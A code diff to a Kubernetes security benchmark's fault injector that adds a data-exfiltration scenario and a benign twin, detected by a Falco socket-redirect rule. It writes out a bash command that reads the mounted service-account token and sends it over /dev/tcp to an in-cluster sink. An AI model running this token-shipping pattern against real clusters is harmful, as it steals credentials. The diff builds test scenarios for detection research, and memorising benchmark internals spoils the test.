@@ -136,6 +136,60 @@ That is a cluster-wide change (it adds the whole sandbox tier to every arm's ale
 falco_l3's `possibility_space`), so it is a campaign decision, not an injector detail.
 `_require_miner_rules_loaded()` checks for it up front and fails with that message rather than
 letting the episode die later in an opaque "rule did not fire".
+
+S4 — data-exfil egress: the fault where the alert names the WRONG attack (and that is the point)
+------------------------------------------------------------------------------------------------
+`exfil_egress` / `benign_telemetry_egress` are the S4 pair from `reports/BENCHMARK_IDEAS.md` §2 and
+`reports/S4_DESIGN.md`. A rogue process in the app pod ships data out over a fresh plaintext TCP
+connection to an in-cluster collector. MITRE **T1048.003** (Exfiltration Over Unencrypted Non-C2
+Protocol), tactic Exfiltration, severity CRITICAL.
+
+Which Falco rule, and the structural wall that decided it (verified against the pinned ruleset,
+and LIVE on a kind+Falco 0.44.1 cluster — see S4_DESIGN.md, not recalled):
+
+  "Redirect STDOUT/STDIN to Network Connection in Container"  -> USED. STABLE ruleset, enabled by
+  default, so S4 needs NO campaign ruleset change (unlike S7). Condition is
+      `dup and container and evt.rawres in (0,1,2) and fd.type in ("ipv4","ipv6") and not ...`
+  i.e. a stdio fd (0/1/2) dup'd onto an ipv4/ipv6 socket. A bash `> /dev/tcp/<host>/<port>`
+  redirect dups the TCP socket onto fd 1 and fires it. The rule keys on the socket-dup, NOT on the
+  destination — no IP/port/allowlist in the condition — so it fires IDENTICALLY for the attack and
+  the benign twin, and cannot tell the agent which is which. That is the design: the agent must
+  reason from what was read and where it went, not read a verdict off the alert.
+
+  The WALL that forced this rule (the same one S7 hit): every `outbound`-macro rule ends with
+  `not fd.snet in (rfc_1918_addresses)`, and every in-cluster ClusterIP/pod IP is RFC1918 — so no
+  `outbound` rule (including the exfil-tagged "Interpreted procs outbound network activity") can
+  EVER fire on a sink we host in-cluster. The `dup`-based rule sidesteps this because it does not
+  look at the destination at all. Consequence worth knowing: the firing rule's own tag reads
+  `mitre_execution / T1059` ("reverse shell / RCE"), NOT exfiltration — a DIFFERENT wrong label,
+  not the answer. The ground truth still records T1048.003 (what the injector did); the tag/GT
+  divergence is a feature, and it only bites the SEVERITY sub-question (scored ordinally).
+
+The C2 sink (in-cluster only, nothing leaves the node): TWO minimal python raw-socket
+accept-and-drain pods + ClusterIP Services in the app namespace — `data-collector` (the attack's
+destination; a NEUTRAL name, deliberately NOT "exfil-sink", so the destination name never leaks the
+verdict) and `telemetry-collector` (the twin's documented-legitimate destination). Both are
+deployed by BOTH halves so the cluster state is identical and the ONLY difference is the loop's
+action. They store nothing (drain to nothing); they exist only so the client's connect+dup
+succeeds. Note (measured): a freshly-started sink pod fires its OWN startup alerts
+("Drop and execute new binary", "Launch Sensitive Mount Container") on the SINK pod — those carry
+the sink's k8s.pod.name, so `_verify_falco(pod=<app pod>)` filters them out, and the problem
+session's normal startup-noise settle ages them out of the agent's window.
+
+Attack vs twin — same rule, differ in SOURCE (primary) and DESTINATION (corroboration):
+  exfil_egress            transient host-loop: `cat <SA token> > /dev/tcp/data-collector/9000`
+                          reads a real credential (the mounted SA token) and ships it to the
+                          unlisted collector. Fires ONLY "Redirect STDOUT/STDIN..." on the app pod
+                          (the SA token is NOT in Falco's `sensitive_files`, so no second rule —
+                          kept single-signature so it is a pure exfil, not an S5->S4 chain).
+  benign_telemetry_egress transient host-loop: `cat /proc/uptime > /dev/tcp/telemetry-collector/9000`
+                          ships innocuous uptime telemetry to the documented collector. Fires the
+                          SAME one rule. The discriminator an agent can actually read is the
+                          `proc.cmdline` field (token vs /proc/uptime) and the destination Service.
+
+Transient host-loop, not persistent-in-pod (like transient_read, not like the miner): each cycle
+is a one-shot `kubectl exec` that exits, so nothing lingers in the pod for `ps` — base's
+logs/metrics/specs/`ps` investigation is blind and only Falco's per-cycle alert witnesses it.
 """
 
 import json
@@ -194,6 +248,24 @@ _CPU_JOB_EXE = "/tmp/analytics-job"
 
 _MINER_RULE_STRATUM = "Detect crypto miners using the Stratum protocol"
 _MINER_RULE_KNOWN_BINARY = "Known Cryptominer Process Executed"
+
+# ---- S4 data-exfil egress pair (see the S4 section of the module docstring) -------------------
+# The rule fired by BOTH halves — a plain socket-dup detection, NOT destination-aware, NOT named
+# for exfil/C2. Verified against falco-rules-5.1.0 (the deployed stable ruleset) and live.
+_EXFIL_RULE_REDIRECT = "Redirect STDOUT/STDIN to Network Connection in Container"
+# The two in-cluster collectors. Names are load-bearing: the attack's destination is NEUTRAL
+# (`data-collector`) so it never announces the verdict; the twin's is the documented-legitimate
+# `telemetry-collector`. The discriminator is the SOURCE read (cmdline), not the destination name.
+_EXFIL_ATTACK_SINK = "data-collector"
+_EXFIL_TWIN_SINK = "telemetry-collector"
+_EXFIL_SINK_PORT = 9000
+_EXFIL_SINK_IMAGE = os.getenv("ARRIVE_SINK_IMAGE", "python:3.11-slim")
+# Label for bulk teardown of every sink this module creates.
+_EXFIL_SINK_LABEL = "arrive-sink"
+# What each half reads and where it sends it. Delivered through `bash -c '<...>'`: `> /dev/tcp/...`
+# is a bash builtin (sh/dash lack it) and is what performs the socket dup the rule matches.
+_EXFIL_ATTACK_SOURCE = "/var/run/secrets/kubernetes.io/serviceaccount/token"   # a real credential
+_EXFIL_TWIN_SOURCE = "/proc/uptime"                                           # innocuous telemetry
 
 # Where Falco lives, for post-injection verification (mirrors mcp_servers/falco_source.py).
 FALCO_NAMESPACE = os.getenv("FALCO_NAMESPACE", "falco")
@@ -677,6 +749,136 @@ class SecurityRuntimeInjector(FaultInjector):
 
     def recover_benign_secret_read(self, microservices: list[str] = None):
         self._stop_host_loops()
+
+    # ---- S4 data-exfil egress: shared sink infrastructure -------------------------------------
+    # Both sinks are deployed by BOTH halves so the cluster state is identical across the pair and
+    # the only variable is the loop's action. The listener stores nothing — it accepts and drains,
+    # which is all that is needed for the client's connect+dup (and hence the Falco rule) to fire.
+    def _sink_listener_src(self) -> str:
+        # A bare accept-and-drain loop. The manifest is piped to kubectl via STDIN (not `echo`),
+        # so the newlines survive: `echo '<json>'` under /bin/sh (dash) would expand the JSON's
+        # `\n` escapes and YAML double-quoted line-folding would then collapse them to spaces,
+        # flattening this into one line and breaking `python3 -c`. See _ensure_sinks.
+        return (
+            "import socket\n"
+            "s=socket.socket()\n"
+            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
+            f"s.bind((\"0.0.0.0\",{_EXFIL_SINK_PORT}))\n"
+            "s.listen(64)\n"
+            "while True:\n"
+            "    c,a=s.accept()\n"
+            "    try:\n"
+            "        while c.recv(65536):\n"
+            "            pass\n"
+            "    except OSError:\n"
+            "        pass\n"
+            "    c.close()\n"
+        )
+
+    def _sink_objects(self, name: str) -> list[dict]:
+        labels = {"app": name, _EXFIL_SINK_LABEL: "true"}
+        pod = {
+            "apiVersion": "v1", "kind": "Pod",
+            "metadata": {"name": name, "namespace": self.namespace, "labels": labels},
+            "spec": {
+                # No SA token mounted: the sink has no reason for one, and it trims one class of
+                # the sink's own startup noise.
+                "automountServiceAccountToken": False,
+                "containers": [{
+                    "name": "sink",
+                    "image": _EXFIL_SINK_IMAGE,
+                    "command": ["python3", "-c", self._sink_listener_src()],
+                    "ports": [{"containerPort": _EXFIL_SINK_PORT}],
+                }],
+            },
+        }
+        svc = {
+            "apiVersion": "v1", "kind": "Service",
+            "metadata": {"name": name, "namespace": self.namespace,
+                         "labels": {_EXFIL_SINK_LABEL: "true"}},
+            "spec": {"selector": {"app": name},
+                     "ports": [{"port": _EXFIL_SINK_PORT, "targetPort": _EXFIL_SINK_PORT}]},
+        }
+        return [pod, svc]
+
+    def _ensure_sinks(self):
+        """Deploy both collectors (idempotent) and block until they are Ready.
+
+        The loop's `> /dev/tcp/<sink>/<port>` only dups the socket if `connect` succeeds, so the
+        Falco rule cannot fire — and `_verify_falco` would then wrongly raise — unless the sink is
+        actually accepting first. Hence the readiness wait before any loop starts.
+        """
+        manifest = json.dumps({
+            "apiVersion": "v1", "kind": "List",
+            "items": self._sink_objects(_EXFIL_ATTACK_SINK) + self._sink_objects(_EXFIL_TWIN_SINK),
+        })
+        # Pipe via STDIN, NOT `echo '<json>'` — see _sink_listener_src for why the multiline
+        # python source would otherwise be flattened by dash-echo + YAML line-folding.
+        self.kubectl.exec_command("kubectl apply -f -", input_data=manifest)
+        for name in (_EXFIL_ATTACK_SINK, _EXFIL_TWIN_SINK):
+            self.kubectl.exec_command(
+                f"kubectl wait --for=condition=Ready pod -l app={name} "
+                f"-n {self.namespace} --timeout=120s"
+            )
+        print(f"[security_runtime] exfil sinks ready: {_EXFIL_ATTACK_SINK}, {_EXFIL_TWIN_SINK} "
+              f"| ns: {self.namespace}")
+
+    def _delete_sinks(self):
+        self.kubectl.exec_command(
+            f"kubectl delete pod,svc -l {_EXFIL_SINK_LABEL}=true "
+            f"-n {self.namespace} --ignore-not-found"
+        )
+
+    # SR.8 - exfil_egress (ATTACK, detected=True): S4. A rogue transient process ships a real
+    # credential (the mounted SA token) out to the unlisted collector over a fresh plaintext TCP
+    # connection. `> /dev/tcp/...` dups the socket -> fires "Redirect STDOUT/STDIN to Network
+    # Connection in Container", and ONLY that (the SA token is not in Falco's sensitive_files, so
+    # there is no second rule — kept single-signature so the pair stays matched).
+    def inject_exfil_egress(self, microservices: list[str]):
+        self._ensure_sinks()
+        for service in microservices:
+            pod = self._first_pod(service)
+            if not pod:
+                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
+                continue
+            self._start_host_loop(
+                pod,
+                f"bash -c 'cat {_EXFIL_ATTACK_SOURCE} > /dev/tcp/{_EXFIL_ATTACK_SINK}/{_EXFIL_SINK_PORT}'",
+            )
+            print(f"[security_runtime] DATA EXFIL: SA token -> {_EXFIL_ATTACK_SINK}:{_EXFIL_SINK_PORT} "
+                  f"from pod {pod} ({service}) via host loop | ns: {self.namespace}")
+            self._verify_falco([_EXFIL_RULE_REDIRECT], pod)
+
+    def recover_exfil_egress(self, microservices: list[str] = None):
+        self._stop_host_loops()
+        self._delete_sinks()
+        print(f"[security_runtime] stopped exfil loop [{_HOST_LOOP_MARKER}] and removed sinks "
+              f"| ns: {self.namespace}")
+
+    # SR.9 - benign_telemetry_egress (BENIGN TWIN of exfil_egress, detected=False): the SAME
+    # mechanism and the SAME Falco rule, shipping innocuous uptime telemetry to the DOCUMENTED
+    # collector. The discriminator is the source (proc.cmdline: /proc/uptime vs the SA token) and
+    # the destination Service — not the alert, which is identical. An agent that flags any outbound
+    # redirect as exfil false-positives here.
+    def inject_benign_telemetry_egress(self, microservices: list[str]):
+        self._ensure_sinks()
+        for service in microservices:
+            pod = self._first_pod(service)
+            if not pod:
+                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
+                continue
+            self._start_host_loop(
+                pod,
+                f"bash -c 'cat {_EXFIL_TWIN_SOURCE} > /dev/tcp/{_EXFIL_TWIN_SINK}/{_EXFIL_SINK_PORT}'",
+            )
+            print(f"[security_runtime] BENIGN telemetry egress: uptime -> {_EXFIL_TWIN_SINK}:{_EXFIL_SINK_PORT} "
+                  f"from pod {pod} ({service}) via host loop | ns: {self.namespace}")
+            # A real twin fires the shared rule — verify it, same contract as every runtime twin.
+            self._verify_falco([_EXFIL_RULE_REDIRECT], pod)
+
+    def recover_benign_telemetry_egress(self, microservices: list[str] = None):
+        self._stop_host_loops()
+        self._delete_sinks()
 
 
 if __name__ == "__main__":
